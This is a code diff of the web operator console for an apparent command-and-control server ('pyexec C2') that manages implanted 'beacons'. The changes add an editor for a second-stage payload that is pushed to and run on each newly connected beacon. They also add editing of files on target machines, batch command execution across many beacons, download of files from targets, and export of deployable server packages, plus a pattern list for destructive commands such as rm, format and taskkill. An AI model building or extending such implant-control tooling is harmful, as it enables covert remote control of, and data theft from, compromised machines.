@@ -28,11 +28,12 @@
         <span id="st-clientkey" style="color:var(--danger);">client_key 未生成</span>
         <span style="flex:1;"></span>
         <button id="c2-toggle-btn" class="btn btn-sm btn-primary" onclick="toggleC2()" title="启动/停止 C2 server">启动</button>
-        <button class="btn btn-sm" onclick="openDeployModal()" title="生成 implant 部署命令">部署向导</button>
-        <button class="btn btn-sm" onclick="openListenerModal()" title="配置 server/client 等通道端口">通道配置</button>
-        <button class="btn btn-sm" onclick="openAuditModal()" title="C2 操作审计日志">操作日志</button>
-        <button class="btn btn-sm" onclick="downloadExportConfig()" title="导出独立 server 部署包(代码+配置+说明),在另一台服务器解压即可启动">导出配置</button>
-        <button class="btn btn-sm" onclick="openFileEditModal()" title="读取/编辑目标机文件(弹窗内编辑后保存推回)">文件编辑</button>
+        <button id="c2-deploy-btn" class="btn btn-sm" onclick="openDeployModal()" title="生成 implant 部署命令">部署向导</button>
+        <button id="c2-listener-btn" class="btn btn-sm" onclick="openListenerModal()" title="配置 server/client 等通道端口">通道配置</button>
+        <button id="c2-audit-btn" class="btn btn-sm" onclick="openAuditModal()" title="C2 操作审计日志">操作日志</button>
+        <button id="c2-export-btn" class="btn btn-sm" onclick="downloadExportConfig()" title="导出独立 server 部署包(代码+配置+说明),在另一台服务器解压即可启动">导出配置</button>
+        <button id="c2-stage2-btn" class="btn btn-sm" onclick="editStage2()" title="查看/编辑二阶段载荷源码(明文),新 beacon 首次回连时下发执行">二阶段载荷</button>
+        <button id="c2-fe-btn" class="btn btn-sm" onclick="openFileEditModal()" title="读取/编辑目标机文件(弹窗内编辑后保存推回)">文件编辑</button>
         <button class="btn btn-sm btn-primary" onclick="openRemoteModal()" title="以 client 模式连接远端独立 server 进行远程管理">远程模式</button>
         <span id="remote-badge" style="display:none;color:var(--success);white-space:nowrap;">🔗 远程: <b id="remote-badge-url">-</b></span>
     </div>
@@ -44,7 +45,7 @@
                 <div class="card-title">
                     <h3 style="margin:0;">Beacon 列表</h3>
                     <div class="action-buttons">
-                        <button id="auto-refresh-btn" class="btn btn-sm" onclick="toggleAutoRefresh()">自动刷新: 关</button>
+                        <button id="auto-refresh-btn" class="btn btn-sm" onclick="toggleAutoRefresh()">自动刷新: 开</button>
                         <button class="btn btn-sm" onclick="loadBeacons()">刷新</button>
                     </div>
                 </div>
@@ -103,13 +104,20 @@
                 <div class="term-body" id="c2-output">
                     <div class="term-line tinfo"><span class="term-ts"></span><span>FlowScan pyexec C2 控制台 · Tab 补全命令/模块/beacon（含说明）· ↑↓ 选择 · 回车确认 · Esc 关闭</span></div>
                 </div>
-                <div style="display:flex;gap:8px;padding:8px 12px 0;align-items:center;">
-                    <span style="font-size:0.72rem;color:#8a93a3;white-space:nowrap;user-select:none;">行过滤:</span>
-                    <input type="text" id="c2-filter-inc" class="form-control form-control-sm" placeholder="只显示包含关键字的行（留空=不过滤）" oninput="applyTermFilter()" aria-label="只显示包含关键字的行">
-                    <input type="text" id="c2-filter-exc" class="form-control form-control-sm" placeholder="不显示包含关键字的行（留空=不过滤）" oninput="applyTermFilter()" aria-label="不显示包含关键字的行">
+                <div style="display:flex;gap:6px;padding:8px 12px 0;align-items:center;flex-wrap:wrap;">
+                    <input type="text" id="c2-f-new-inc" class="form-control form-control-sm" style="flex:1 1 160px;min-width:0;" placeholder="模块输出只显示含关键字的行" title="模块执行输出显示时,只显示包含关键字的行(留空=不过滤)" aria-label="模块输出只显示含关键字的行">
+                    <input type="text" id="c2-f-new-exc" class="form-control form-control-sm" style="flex:1 1 160px;min-width:0;" placeholder="模块输出排除含关键字的行" title="模块执行输出显示时,排除包含关键字的行(留空=不过滤)" aria-label="模块输出排除含关键字的行">
+                    <input type="text" id="c2-f-view-inc" class="form-control form-control-sm" style="flex:1 1 160px;min-width:0;" placeholder="已有显示筛选含关键字行" title="在当前屏幕已有显示中筛选,只保留包含关键字的行(留空=不过滤)" aria-label="已有显示筛选含关键字行" oninput="applyTermViewFilter()">
+                    <input type="text" id="c2-f-view-exc" class="form-control form-control-sm" style="flex:1 1 160px;min-width:0;" placeholder="已有显示排除含关键字行" title="在当前屏幕已有显示中筛选,排除包含关键字的行(留空=不过滤)" aria-label="已有显示排除含关键字行" oninput="applyTermViewFilter()">
+                    <label class="switch" style="flex:0 0 auto;margin:0 0 0 4px;" title="开启后四个过滤栏支持正则表达式匹配">
+                        <input type="checkbox" id="c2-f-regex" onchange="regexToggleChanged()" aria-label="过滤栏支持正则">
+                        <span class="switch-slider"></span>
+                    </label>
+                    <span style="font-size:0.7rem;color:var(--text-faint);white-space:nowrap;user-select:none;">正则</span>
                 </div>
                 <div class="term-input-bar">
                     <span class="term-prompt">pyexec&gt;</span>
+                    <span id="c2-caret" class="c2-caret" aria-hidden="true">▍</span>
                     <textarea id="c2-cmd" class="term-input" rows="1" autocomplete="off" spellcheck="false" aria-label="C2 命令输入"
                               placeholder="show / use &lt;bid&gt; / exec whoami / result ...（回车执行 · Shift+回车换行）"></textarea>
                     <button class="btn btn-sm btn-primary" onclick="execCmd()" style="white-space:nowrap;">执行</button>
@@ -145,6 +153,7 @@
                     <a class="tab active" data-mtab="implant" onclick="return switchMtab('implant')" href="#">植入模块</a>
                     <a class="tab" data-mtab="server" onclick="return switchMtab('server')" href="#">Server 模块</a>
                     <a class="tab" data-mtab="manage" onclick="return switchMtab('manage')" href="#">模块管理</a>
+                    <a class="tab" data-mtab="history" onclick="return switchMtab('history')" href="#">历史命令</a>
                 </nav>
 
                 {# 植入模块 #}
@@ -174,6 +183,12 @@
                     <hr>
                     <h3 style="font-size:0.85rem;">已安装模块文件</h3>
                     <div id="module-manage-list" class="mod-list"></div>
+                </div>
+
+                {# 历史命令 #}
+                <div id="mtab-history" style="display:none;">
+                    <p class="help-text">终端执行过的命令(最多 200 条, 存于 localStorage)。</p>
+                    <div id="history-list" class="mod-list" style="font-family:var(--font-mono);font-size:0.72rem;line-height:1.6;"></div>
                 </div>
             </div>
         </div>
@@ -350,10 +365,6 @@
             <div class="form-group" style="margin:0;">
                 <label for="lc-client_timeout">client 超时(s)</label>
                 <input type="number" id="lc-client_timeout" class="form-control" style="width:90px;font-family:var(--font-mono);">
-            </div>
-            <div class="form-group" style="margin:0;">
-                <label for="lc-exec_timeout">exec 超时(s)</label>
-                <input type="number" id="lc-exec_timeout" class="form-control" style="width:90px;font-family:var(--font-mono);">
             </div>
         </div>
         <div class="form-row" style="gap:8px;margin-bottom:10px;">
@@ -783,12 +794,18 @@ function fs3DialogOpen(opts) {
     document.getElementById('fs3-dialog-title').textContent = opts.title || '提示';
     var body = document.getElementById('fs3-dialog-body');
     var msg = opts.message || '';
-    if (opts.mode === 'text' || opts.mode === 'textarea') {
-        var rows = opts.mode === 'textarea' ? 18 : 1;
+    if (opts.mode === 'text' || opts.mode === 'textarea' || opts.mode === 'note') {
+        var isNote = opts.mode === 'note';
+        var rows = opts.mode === 'textarea' ? 18 : (isNote ? 4 : 1);
         var inputHtml = '<textarea id="fs3-dialog-input" rows="' + rows +
             '" style="width:100%;box-sizing:border-box;font-family:var(--font-mono);font-size:0.78rem;resize:vertical;background:rgba(3,7,15,0.6);color:var(--text);border:1px solid var(--border);border-radius:6px;padding:8px;margin-top:8px;"' +
             (opts.placeholder ? ' placeholder="' + escapeHtml(opts.placeholder) + '"' : '') + '></textarea>';
-        body.innerHTML = '<div style="white-space:pre-wrap;">' + escapeHtml(msg) + '</div>' + inputHtml;
+        var hint = isNote ? '<div id="fs3-dialog-note-hint" style="display:none;color:var(--danger);font-size:0.72rem;margin-top:6px;">请填写执行备注后确认(Ctrl+Enter)</div>' : '';
+        body.innerHTML = '<div style="white-space:pre-wrap;">' + escapeHtml(msg) + '</div>' + inputHtml + hint;
+        if (isNote) {
+            document.getElementById('fs3-dialog-cancel').style.display = '';
+            document.getElementById('fs3-dialog-ok').textContent = opts.okText || '确认执行 (Ctrl+Enter)';
+        }
         _fs3InputEl = document.getElementById('fs3-dialog-input');
         _fs3InputEl.value = opts.value || '';
         setTimeout(function () { _fs3InputEl.focus(); _fs3InputEl.select(); }, 50);
@@ -824,6 +841,14 @@ function fs3DialogClose(val) {
 function fs3DialogOk() {
     if (!_fs3Dialog) return;
     if (_fs3InputEl) {
+        // note 模式: 备注必填, 为空不关闭并提示
+        if (_fs3Dialog.requireNote && !_fs3InputEl.value.trim()) {
+            const hint = document.getElementById('fs3-dialog-note-hint');
+            if (hint) hint.style.display = 'block';
+            _fs3InputEl.style.borderColor = 'var(--danger)';
+            _fs3InputEl.focus();
+            return;
+        }
         fs3DialogClose(_fs3InputEl.value);
     } else {
         fs3DialogClose(true);
@@ -848,6 +873,17 @@ function fs3Confirm(message, title) {
     });
 }
 
+// 危险命令确认(带必填备注, Ctrl+Enter 确认):返回 Promise<备注|null>
+function fs3NoteConfirm(message, title) {
+    return new Promise(function (resolve) {
+        fs3DialogOpen({
+            title: title || '危险命令确认', message: message, mode: 'note',
+            okText: '确认执行 (Ctrl+Enter)', placeholder: '填写执行备注(必填)...',
+            requireNote: true, resolve: resolve
+        });
+    });
+}
+
 // 页面内提示(alert 替代):返回 Promise<void>
 function fs3Alert(message, title) {
     return new Promise(function (resolve) {
@@ -855,11 +891,17 @@ function fs3Alert(message, title) {
     });
 }
 
-// Esc 关闭
+// Esc 关闭 / Ctrl+Enter 确认(备注模式同校验)
 document.addEventListener('keydown', function (e) {
+    var dlg = document.getElementById('fs3-dialog');
     if (e.key === 'Escape') {
-        var dlg = document.getElementById('fs3-dialog');
         if (dlg && dlg.style.display !== 'none') fs3DialogClose(null);
+    } else if (e.key === 'Enter' && (e.ctrlKey || e.metaKey)) {
+        // 对话框打开时 Ctrl+Enter 确认(note 模式备注为空会被 fs3DialogOk 拦截)
+        if (dlg && dlg.style.display !== 'none' && _fs3Dialog) {
+            e.preventDefault();
+            fs3DialogOk();
+        }
     }
 });
 
@@ -933,6 +975,7 @@ c2out.addEventListener('scroll', function() {
 function termAppend(text, cls) {
     const lines = String(text == null ? '' : text).split('\n');
     for (const line of lines) {
+        if (!termLineVisible(line)) continue;  // 新行过滤不通过 → 不入 DOM 不显示
         const div = document.createElement('div');
         const kls = cls || (line.startsWith('[!]') ? 'terr' : line.startsWith('[+]') ? 'tok'
                    : (line.startsWith('[>]') || line.startsWith('[*]')) ? 'tinfo' : 'tplain');
@@ -946,29 +989,52 @@ function termAppend(text, cls) {
         div.appendChild(ts);
         div.appendChild(body);
         c2out.appendChild(div);
-        if (!termLineVisible(line)) div.style.display = 'none';  // 行过滤生效时隐藏新行
     }
     while (c2out.children.length > TERM_MAX_LINES) c2out.removeChild(c2out.firstChild);
     if (termAutoScroll) c2out.scrollTop = c2out.scrollHeight;
 }
 
-// ── 行过滤(只显示包含 / 不显示包含关键字的行)──
+// ── 行过滤(4 栏: 新输出含/排 + 已有显示含/排; 正则开关) ──
+function c2FilterRegexOn() {
+    const el = document.getElementById('c2-f-regex');
+    return !!(el && el.checked);
+}
+// pat 为空返回 null(不过滤); 否则返回是否命中(正则开关开启时按正则)
+function c2FilterMatch(txt, pat) {
+    const p = (pat || '').trim();
+    if (!p) return null;
+    if (c2FilterRegexOn()) {
+        try { return new RegExp(p).test(txt); }
+        catch (e) { return txt.includes(p); }  // 非法正则按字面匹配
+    }
+    return txt.includes(p);
+}
+// 新输出行是否显示(前两栏): 列1 含才显示, 列2 含则排除
 function termLineVisible(line) {
-    const inc = document.getElementById('c2-filter-inc').value.trim();
-    const exc = document.getElementById('c2-filter-exc').value.trim();
-    if (inc && !line.includes(inc)) return false;
-    if (exc && line.includes(exc)) return false;
+    const inc = c2FilterMatch(line, document.getElementById('c2-f-new-inc').value);
+    const exc = c2FilterMatch(line, document.getElementById('c2-f-new-exc').value);
+    if (inc === false) return false;
+    if (exc === true) return false;
     return true;
 }
-
-function applyTermFilter() {
+// 已有显示筛选(后两栏): 对当前屏幕已显示的行重算可见性
+function applyTermViewFilter() {
+    const incPat = document.getElementById('c2-f-view-inc').value;
+    const excPat = document.getElementById('c2-f-view-exc').value;
     for (const div of c2out.querySelectorAll('.term-line')) {
         const body = div.querySelector('.term-line-body');
         const txt = body ? body.textContent : '';
-        div.style.display = termLineVisible(txt) ? '' : 'none';
+        const inc = c2FilterMatch(txt, incPat);
+        const exc = c2FilterMatch(txt, excPat);
+        let show = true;
+        if (inc === false) show = false;
+        if (exc === true) show = false;
+        div.style.display = show ? '' : 'none';
     }
     if (termAutoScroll) c2out.scrollTop = c2out.scrollHeight;
 }
+// 正则开关变化: 前两栏对新行即时生效(append 时判定), 后两栏重筛已有显示
+function regexToggleChanged() { applyTermViewFilter(); }
 
 function clearTerm() { c2out.innerHTML = ''; termAppend('(输出日志已清空)', 'tinfo'); }
 function copyTerm() {
@@ -986,11 +1052,37 @@ let histIdx = termHist.length;
 let histDraft = '';
 const c2cmd = document.getElementById('c2-cmd');
 
+// 闪烁光标对齐 textarea 空态 caret 同 x(focus-within 会隐藏它, 聚焦后系统光标接管)
+const c2CaretEl = document.getElementById('c2-caret');
+function alignTermCaret() {
+    if (!c2CaretEl || !c2cmd) return;
+    const bar = c2cmd.closest('.term-input-bar');
+    if (!bar) return;
+    const br = bar.getBoundingClientRect();
+    const ir = c2cmd.getBoundingClientRect();
+    c2CaretEl.style.left = Math.round(ir.left - br.left) + 'px';
+}
+alignTermCaret();
+window.addEventListener('resize', alignTermCaret);
+
 function pushHistory(line) {
     termHist.push(line);
     if (termHist.length > 200) termHist = termHist.slice(-200);
     localStorage.setItem('fs3_c2_history', JSON.stringify(termHist));
     histIdx = termHist.length;
+    // 历史命令面板可见时实时刷新
+    if (currentMtab === 'history') renderHistory();
+}
+
+function renderHistory() {
+    const box = document.getElementById('history-list');
+    if (!box) return;
+    if (!termHist.length) { box.innerHTML = '<span class="empty">暂无历史命令</span>'; return; }
+    box.innerHTML = termHist.map(function(line) {
+        return '<div style="white-space:pre-wrap;word-break:break-all;border-bottom:1px dashed var(--border);padding:3px 2px;">' +
+            escapeHtml(line) + '</div>';
+    }).join('');
+    box.scrollTop = box.scrollHeight;  // 滚到底(最新在末尾)
 }
 
 // ── Tab 补全 ──
@@ -1111,13 +1203,24 @@ c2cmd.addEventListener('keydown', function(e) {
 document.addEventListener('click', function(e) { if (!compBox.contains(e.target) && e.target !== c2cmd) hideComp(); });
 
 // ── 终端命令执行 ──
-async function termCmd(line) {
+// 危险命令闸门(2026-09-04 下沉到 termCmd): 所有入口(终端回车/抽屉快捷按钮/
+// 模块面板/编辑器发送)统一经此校验——此前只在 execCmd 挂确认,其它入口可
+// 绕过直接执行破坏性命令。取消=不执行不回显。程序化/已整批确认过的调用
+// 传 {bypass:true}。
+async function termCmd(line, opts) {
+    opts = opts || {};
+    const trimmed = (line || '').trim();
+    if (!opts.bypass && trimmed && isDangerCmd(trimmed)) {
+        const okc = await fs3NoteConfirm('检测到危险命令:\n' + trimmed + '\n\n请填写执行备注(必填):');
+        if (!okc) return false;
+    }
     termAppend('pyexec> ' + line, 'techo');
     // 终端 use <bid> 选中:同步前端 currentBid + 启动结果轮询(与点击 beacon 卡片等价)
     const m = line.trim().match(/^use\s+([0-9a-f]{16})/i);
     if (m) {
         currentBid = m[1];
         shownResultKeys = {};
+        remoteLastDetail = '';   // 切 beacon 重置远程详情基线,防头部内容串台(B3)
         startResultPolling();
         document.getElementById('console-beacon').textContent = 'beacon: ' + currentBid.slice(0, 8) + '…';
         loadBeacons();
@@ -1133,6 +1236,7 @@ async function termCmd(line) {
     loadBeacons();
     // 命令执行后加速拉一次结果(如 exec 已立即回传),不依赖 2s 轮询周期
     setTimeout(trackBeaconResults, 800);
+    return true;
 }
 
 async function execCmd() {
@@ -1140,13 +1244,14 @@ async function execCmd() {
     // 支持多行(Shift+回车):逐行顺序执行,每行单独进历史
     const lines = raw.split('\n').map(s => s.trim()).filter(Boolean);
     if (!lines.length) return;
-    // 危险命令二次确认(kill/exit/persist/set_key/raw/uplevel/破坏性 exec 等)
+    // 危险命令二次确认:整批一次确认(kill/exit/persist/set_key/raw/uplevel/
+    // 破坏性 exec 等),确认后逐行 bypass(termCmd 闸门不再重复弹)
     const danger = lines.filter(isDangerCmd);
-    if (danger.length && !(await fs3Confirm('检测到危险命令:\n' + danger.join('\n') + '\n\n确认执行？'))) return;
+    if (danger.length && !(await fs3NoteConfirm('检测到危险命令:\n' + danger.join('\n') + '\n\n请填写执行备注(必填):'))) return;
     lines.forEach(l => pushHistory(l));
     c2cmd.value = '';
     (async function() {
-        for (const l of lines) await termCmd(l);
+        for (const l of lines) await termCmd(l, {bypass: true});
     })();
 }
 
@@ -1156,6 +1261,8 @@ function isDangerCmd(line) {
     const t = (line || '').trim().toLowerCase();
     if (!t) return false;
     const first = t.split(/\s+/)[0];
+    // s_exec build(构建 agent 包)为常规操作, 不做危险命令处理; 其余 s_exec 子命令仍危险
+    if (first === 's_exec' && t.startsWith('s_exec build')) return false;
     if (DANGER_CMDS.indexOf(first) !== -1) return true;
     if (first === 'exec' && /(rm |del |rd |format |shutdown|reboot|taskkill|pkill |killall )/.test(t)) return true;
     return false;
@@ -1224,7 +1331,7 @@ async function loadStatusDetail() {
         const on = Object.entries(data.listeners || {}).filter(function(e) { return e[1] && e[1].enabled; });
         document.getElementById('st-listen').textContent = on.map(function(e) {
             return e[0] + ':' + e[1].port;
-        }).join(' ') || '仅 beacon';
+        }).join(' ') || '无监听(通道全关)';
         document.getElementById('st-key').textContent = data.implant_key_fp || '-';
         const ckEl = document.getElementById('st-clientkey');
         if (data.client_key_ready) {
@@ -1236,6 +1343,10 @@ async function loadStatusDetail() {
         }
     } catch (e) {}
 }
+
+// 状态栏计数独立轮询(5s): beacon 上线/掉线/任务入队后 st-beacons / st-pending
+// 自动更新, 不依赖手动刷新或 auto-refresh(默认关)
+setInterval(loadStatusDetail, 5000);
 
 async function genClientKey() {
     if (!(await fs3Confirm('生成 client_key 并写回 config.json？(client 通道加密密钥,生成后即可用 client 连接'))) return;
@@ -1279,6 +1390,32 @@ function isRemote() { return c2Remote.connected; }
 function downloadExportConfig() {
     window.location.href = '/api/c2/export-config';
     showNotice('正在导出独立 server 部署包(代码+配置+说明)...', true);
+}
+
+// ── 二阶段载荷编辑(明文查看/保存; 新 beacon 首次回连下发) ──
+async function editStage2() {
+    let cur = '';
+    try {
+        const resp = await fetch('/api/c2/stage2');
+        const data = await resp.json();
+        if (data.ok) cur = data.code || '';
+    } catch (e) {}
+    const hint = cur ? '当前二阶段载荷源码(明文, 编辑后保存即生效):'
+                      : '当前未设置二阶段载荷; 直接粘贴源码保存即可:';
+    const code = await fs3Prompt(hint + '\n新 beacon 首次回连时下发执行(保存立即生效, 无需 reload)。',
+        cur, '二阶段载荷 Python 源码(明文)...', true);
+    if (code === null) return;   // 取消
+    try {
+        const resp = await fetch('/api/c2/stage2', {
+            method: 'POST', headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({code: code})});
+        const data = await resp.json();
+        showNotice(data.ok
+            ? ('✓ ' + (data.message || '二阶段载荷已保存'))
+            : ('✗ ' + (data.error || data.message || '保存失败')), data.ok);
+    } catch (e) {
+        showNotice('✗ 保存失败: ' + e.message, false);
+    }
 }
 
 function openRemoteModal() {
@@ -1347,10 +1484,16 @@ function applyRemoteUI() {
         badge.style.display = on ? '' : 'none';
         document.getElementById('remote-badge-url').textContent = c2Remote.url;
     }
-    // 本地专属按钮远程模式下禁用
-    ['c2-toggle-btn'].forEach(function(id) {
+    // 本地专属按钮远程模式下禁用(2026-09-04 B8 扩展): 通道配置/重启/审计/
+    // 导出/二阶段/文件编辑/部署向导/启动停止均作用于本地 server——远程态
+    // 仍可点会把操作落在本地,造成"以为在管远端"的误导
+    ['c2-toggle-btn', 'c2-deploy-btn', 'c2-listener-btn', 'c2-audit-btn',
+     'c2-export-btn', 'c2-stage2-btn', 'c2-fe-btn'].forEach(function(id) {
         const el = document.getElementById(id);
-        if (el) { el.disabled = on; el.title = on ? '远程模式下不可用(管理远端 server)' : el.title; }
+        if (!el) return;
+        if (!el.getAttribute('data-title-orig')) el.setAttribute('data-title-orig', el.title || '');
+        el.disabled = on;
+        el.title = on ? (el.getAttribute('data-title-orig') + ' [远程模式禁用]') : el.getAttribute('data-title-orig');
     });
 }
 
@@ -1387,18 +1530,26 @@ async function loadHidden() {
         const data = await resp.json();
         if (!data.ok) return;
         hiddenBeacons = data.beacons || [];
-        document.getElementById('hidden-count').textContent = hiddenBeacons.length;
+        // 计数只算未过期(面板可见)的, 过期 beacon 随清理动态减少
+        const aliveN = hiddenBeacons.filter(function(b) { return !b.expired; }).length;
+        document.getElementById('hidden-count').textContent = aliveN;
         const hint = document.getElementById('hidden-hint');
-        if (hint) hint.textContent = hiddenBeacons.length ? '未过期 ' + hiddenBeacons.filter(function(b) { return !b.expired; }).length + ' / 过期 ' + hiddenBeacons.filter(function(b) { return b.expired; }).length : '';
+        if (hint) hint.textContent = hiddenBeacons.length ? '未过期 ' + aliveN + ' / 过期 ' + hiddenBeacons.filter(function(b) { return b.expired; }).length : '';
         if (hiddenPanelOpen) renderHiddenList();
     } catch (e) {}
 }
+
+// 收纳计数独立轮询: 不依赖 auto refresh, 过期清理/恢复后动态刷新
+setInterval(loadHidden, 8000);
 
 function toggleHiddenPanel() {
     hiddenPanelOpen = !hiddenPanelOpen;
     document.getElementById('hidden-panel').style.display = hiddenPanelOpen ? 'block' : 'none';
     document.getElementById('beacon-list').style.display = hiddenPanelOpen ? 'none' : 'block';
-    document.getElementById('hidden-toggle').textContent = '📦 收纳 (' + hiddenBeacons.length + ')';
+    // 用 innerHTML 保留 span#hidden-count(textContent 会清掉子节点, 计数将无法再更新)
+    const aliveN = hiddenBeacons.filter(function(b) { return !b.expired; }).length;
+    document.getElementById('hidden-toggle').innerHTML =
+        '📦 收纳 (<span id="hidden-count">' + aliveN + '</span>)';
     if (hiddenPanelOpen) renderHiddenList();
 }
 
@@ -1463,9 +1614,10 @@ function beaconSearchText(b) {
             (b.sys_os || '') + ' ' + (b.tags || []).join(' ') + ' ' + (b.remark || '')).toLowerCase();
 }
 
-function fmtAgo(tsStr) {
-    if (!tsStr) return '';
-    const t = new Date(tsStr.replace(' ', 'T')).getTime();
+function fmtAgo(ts) {
+    if (ts === null || ts === undefined || ts === '') return '';
+    if (typeof ts === 'number') ts = new Date(ts * 1000).toISOString();  // epoch 秒
+    const t = new Date(ts.replace(' ', 'T')).getTime();
     if (!t) return '';
     const s = Math.max(0, (Date.now() - t) / 1000);
     if (s < 90) return Math.round(s) + 's 前';
@@ -1476,10 +1628,11 @@ function fmtAgo(tsStr) {
 
 // 服务器时间统一输出 UTC ISO(带 Z 后缀,见 c2_bridge._iso_utc),
 // 这里解析后转访问者浏览器本地时区显示;无时区后缀的旧字符串按本地解析(兼容)。
-function fmtLocal(tsStr) {
-    if (!tsStr) return '-';
-    const t = new Date(tsStr.replace(' ', 'T')).getTime();
-    if (!t) return String(tsStr);
+function fmtLocal(ts) {
+    if (ts === null || ts === undefined || ts === '') return '-';
+    if (typeof ts === 'number') ts = new Date(ts * 1000).toISOString();  // epoch 秒
+    const t = new Date(ts.replace(' ', 'T')).getTime();
+    if (!t) return String(ts);
     const d = new Date(t);
     const p = function (n) { return (n < 10 ? '0' : '') + n; };
     return d.getFullYear() + '-' + p(d.getMonth() + 1) + '-' + p(d.getDate()) +
@@ -1631,20 +1784,19 @@ async function execBatchCmd() {
     const bids = Object.keys(selectedBeacons);
     if (!line) { showNotice('批量命令为空', false); return; }
     if (!bids.length) { showNotice('未选择 beacon', false); return; }
-    if (isDangerCmd(line) && !(await fs3Confirm('批量执行危险命令: ' + line + '\n目标 ' + bids.length + ' 个 beacon，确认？'))) return;
+    if (isDangerCmd(line) && !(await fs3NoteConfirm('批量执行危险命令: ' + line + '\n目标 ' + bids.length + ' 个 beacon\n\n请填写执行备注(必填):'))) return;
     let okN = 0;
+    // 逐条 use + 执行均走 termCmd(已按 isRemote 分发 + 同步前后端选中):
+    // 此前硬编码 /api/c2/exec——远程模式打在本地 server;且执行后前端
+    // currentBid 与后端 current_beacon 失步(命令会作用到批量最后一个)(B7)
     for (const bid of bids) {
         try {
-            const resp = await fetch('/api/c2/exec', {method: 'POST', headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({line: 'use ' + bid})});
-            await resp.json();
-            const resp2 = await fetch('/api/c2/exec', {method: 'POST', headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({line: line})});
-            const d2 = await resp2.json();
-            if (d2.ok) okN++;
+            await termCmd('use ' + bid, {bypass: true});
+            await termCmd(line, {bypass: true});
+            okN++;
         } catch (e) {}
     }
-    showNotice('批量执行完成: ' + okN + '/' + bids.length + ' 成功', okN === bids.length);
+    showNotice('批量执行完成: ' + okN + '/' + bids.length + ' 成功(终端可看各 beacon 输出)', okN === bids.length);
     document.getElementById('batch-cmd').value = '';
     clearBeaconSel();
 }
@@ -1652,6 +1804,7 @@ async function execBatchCmd() {
 async function selectBeacon(bid) {
     currentBid = bid;
     shownResultKeys = {};
+    remoteLastDetail = '';   // 切 beacon 重置远程详情基线(B3): 新 beacon 详情从头部完整展示
     startResultPolling();
     document.getElementById('console-beacon').textContent = 'beacon: ' + bid.slice(0, 8) + '…';
     termAppend('[>] 已选中 beacon: ' + bid, 'tinfo');
@@ -1692,12 +1845,22 @@ function trackBeaconResults() {
             .then(function(r) { return r.json(); })
             .then(function(d) {
                 if (!d.ok) return;
-                if (!remoteLastDetail) remoteLastDetail = '';
                 if (d.detail && d.detail !== remoteLastDetail) {
-                    const fresh = d.detail.slice(remoteLastDetail.length) || d.detail;
+                    // 行边界增量: 详情是上次的纯追加 → 只显示新增尾巴;
+                    // 否则(切换后首轮/详情被裁剪/头部动态变化)展示全文——
+                    // 不再用整串前缀切片(长度错位会把半截内容当新结果,
+                    // 或把新 beacon 头部整段吞掉, 2026-09-04 B3 修复)
+                    let fresh;
+                    if (remoteLastDetail && d.detail.indexOf(remoteLastDetail) === 0) {
+                        fresh = d.detail.slice(remoteLastDetail.length);
+                    } else {
+                        fresh = d.detail;
+                    }
                     remoteLastDetail = d.detail;
-                    termAppend('── 远端结果更新 ──', 'tinfo');
-                    termAppend(fresh, 'tok');
+                    if (fresh) {
+                        termAppend('── 远端详情更新 ──', 'tinfo');
+                        termAppend(fresh, 'tok');
+                    }
                 }
             })
             .catch(function() {});
@@ -1741,13 +1904,19 @@ let autoRefreshTimer = null;
 function toggleAutoRefresh() {
     const btn = document.getElementById('auto-refresh-btn');
     if (autoRefreshTimer) { clearInterval(autoRefreshTimer); autoRefreshTimer = null; btn.textContent = '自动刷新: 关'; }
-    else { autoRefreshTimer = setInterval(loadBeacons, 10000); btn.textContent = '自动刷新: 开'; loadBeacons(); }
+    else { autoRefreshTimer = setInterval(loadBeacons, 5000); btn.textContent = '自动刷新: 开'; loadBeacons(); }
 }
 
 // ══════════ Beacon 详情抽屉 ══════════
 let bdBeacon = null;
 
 async function openBeaconDetail(bid) {
+    if (isRemote()) {
+        // 详情抽屉走本地 /api/c2/beacon/<id>/detail,远程模式未接线——
+        // 提示走终端(2026-09-04 B8)
+        fs3Alert('远程模式下请用终端: use ' + bid + ' 后查看详情/结果(详情自动回显)');
+        return;
+    }
     document.getElementById('beacon-detail-modal').style.display = 'flex';
     document.getElementById('bd-title').textContent = 'Beacon ' + bid;
     document.getElementById('bd-remark').value = '';
@@ -1863,10 +2032,11 @@ async function saveBeaconRemark() {
     loadBeacons();
 }
 
-function bdQuick(cmd) {
+async function bdQuick(cmd) {
     if (!bdBeacon) return;
-    currentBid = bdBeacon.client_id;
-    termAppend('pyexec> use ' + currentBid, 'techo');
+    // 先同步后端选中(此前只改前端 currentBid + 假回显 use,命令实际打在
+    // 上一个选中的 beacon 上——2026-09-04 修复)
+    await selectBeacon(bdBeacon.client_id);
     termCmd(cmd);
 }
 
@@ -1880,10 +2050,11 @@ async function bdDownload() {
     if (!bdBeacon) return;
     const p = fpath();
     if (!p) { showNotice('路径为空', false); return; }
-    const ok = await fs3Confirm('对 ' + bdBeacon.client_id + ' 下发 download: ' + p + '\n文件会分块传回服务器(reports/c2/ 或模块输出目录),确认？');
+    const ok = await fs3Confirm('对 ' + bdBeacon.client_id + ' 下发 download: ' + p + '\n文件将分块传回服务器,落盘到 server 的 downloads/ 目录,确认？');
     if (!ok) return;
-    termAppend('pyexec> use ' + bdBeacon.client_id, 'techo');
-    await termCmd('download ' + p);
+    // 先同步后端选中;命令显式带 bid,本地路径由 download 命令缺省生成
+    await selectBeacon(bdBeacon.client_id);
+    await termCmd('download ' + bdBeacon.client_id + ' ' + p);
 }
 
 // ══════════ 部署向导 ══════════
@@ -1985,13 +2156,18 @@ function openListenerModal() {
     setv('lc-server_port', c.server_port != null ? c.server_port : '');
     setv('lc-client_port', c.client_port != null ? c.client_port : '');
     setv('lc-client_timeout', c.client_timeout != null ? c.client_timeout : '');
-    setv('lc-exec_timeout', c.exec_timeout != null ? c.exec_timeout : '');
 }
 
 function closeListenerModal() { document.getElementById('listener-modal').style.display = 'none'; }
 
 // ── 文件编辑弹窗(fs3-modal-backdrop 模式) ──
 function openFileEditModal() {
+    if (isRemote()) {
+        // 文件编辑走本地 /api/c2/file-edit + beacon detail,远程模式未接线——
+        // 禁用入口防"操作落在本地/报错"(2026-09-04 B8)
+        fs3Alert('远程模式下请使用终端: edit <bid> <path> 或 download 模块操作文件');
+        return;
+    }
     const sel = document.getElementById('fe-beacon');
     const prev = sel.value;
     sel.innerHTML = '';
@@ -2001,7 +2177,10 @@ function openFileEditModal() {
         o.textContent = b.client_id.slice(0, 8) + ' · ' + (b.sys_platform || '?') + (b.sys_user ? ' · ' + b.sys_user : '');
         sel.appendChild(o);
     });
